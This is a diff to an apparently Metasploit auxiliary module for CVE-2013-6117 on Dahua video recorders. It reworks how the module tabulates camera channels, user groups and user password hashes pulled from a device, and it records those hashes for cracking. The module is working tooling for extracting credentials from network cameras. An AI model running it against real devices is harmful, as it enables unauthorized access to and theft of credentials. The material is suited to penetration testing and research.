@@ -10,7 +10,8 @@ class Metasploit3 < Msf::Auxiliary
       'Author'          => [
         'Jake Reynolds - Depth Security', # Vulnerability Discoverer
         'Tyler Bennett - Talos Infosec', # Metasploit Module
-        'Jon Hart <jon_hart[at]rapid7.com>' # improved metasploit module
+        'Jon Hart <jon_hart[at]rapid7.com>', # improved metasploit module
+        'Nathan McBride' # regex extraordinaire
       ],
       'References'      => [
         [ 'CVE', '2013-6117' ],
@@ -192,18 +193,10 @@ class Metasploit3 < Msf::Auxiliary
     return unless data.length > 1
     print_good("#{peer} -- camera channels:")
     data.each_with_index do |val, index|
-      # puts val, index + 1
-      # next if index > 1
-      number = "#{index}"
-      channels = "#{val[/([[:print:]]+)/]}"
-      # number = "#{val[0]}"
-      # channels = "#{val[1]}"
-      print_status(" #{number}")
-      print_status(" #{channels}")
-      channels_table << ["#{number}".to_i, "#{channels}".to_i]
+      number = index.to_s
+      channels = val[/([[:print:]]+)/].to_s
+      channels_table << [ number, channels ]
       channels_table.print
-      # print_status(" #{val[/([[:print:]]+)/]}")
-      # print_status("  #{index + 1}:#{val[/([[:print:]]+)/]}")
     end
   end
 
@@ -214,19 +207,17 @@ class Metasploit3 < Msf::Auxiliary
     data = response.split('&&')
     usercount = 0
     users_table = Rex::Ui::Text::Table.new(
-      'Header' => 'Dahua Users Hashes and groups',
+      'Header' => 'Dahua Users Hashes and Rights',
       'Indent' => '1',
       'Columns' => ['Username', 'Password Hash', 'Permissions', 'Description']
     )
     print_status("Users\\Hashed Passwords\\Rights\\Description: @ #{rhost}:#{rport}!")
     data.each do |val|
       usercount += 1
-      pass = "#{val[/(([\d]+)[:]([0-9A-Z]+)[:]([0-9A-Z]+))/i]}"
-      # print_status("Perms: #{val[/(([0-9][0-9]*, )*[0-9][0-9]*)/]}")
-      value = pass.split(":")
-      user = "#{value[1]}"
-      md5hash = "#{value[2]}"
-      print_status("  #{val[/(([\d]+)[:]([[:print:]]+))/]}")
+      user, md5hash, rights, name = val.match(/^.*:(.*):(.*):.*:(.*):(.*):.*$/).captures
+      users_table << [user, md5hash, rights, name]
+      users_table.print
+      # print_status("  #{val[/(([\d]+)[:]([[:print:]]+))/]}")
       # Write the dahua hash to the database
       hash = "#{rhost} #{user}:$dahua$#{md5hash}"
       report_hash(rhost, rport, user, hash)
@@ -248,8 +239,18 @@ class Metasploit3 < Msf::Auxiliary
     sock.put(GROUPS)
     return unless (response = sock.get_once)
     data = response.split('&&')
+    groups_table = Rex::Ui::Text::Table.new(
+      'Header' => 'Dahua groups',
+      'Indent' => '1',
+      'Columns' => ['Number', 'Group']
+    )
     print_good("#{peer} -- groups:")
-    data.each { |val| print_status("  #{val[/(([\d]+)[:]([\w]+))/]}") }
+    data.each { |val|
+      number = val[/(([\d]+))/].to_i
+      groups = val[/(([a-z]+))/].to_i
+      groups_table << [ number, groups ]
+      groups_table.print
+    }
   end
 
   def reset_user
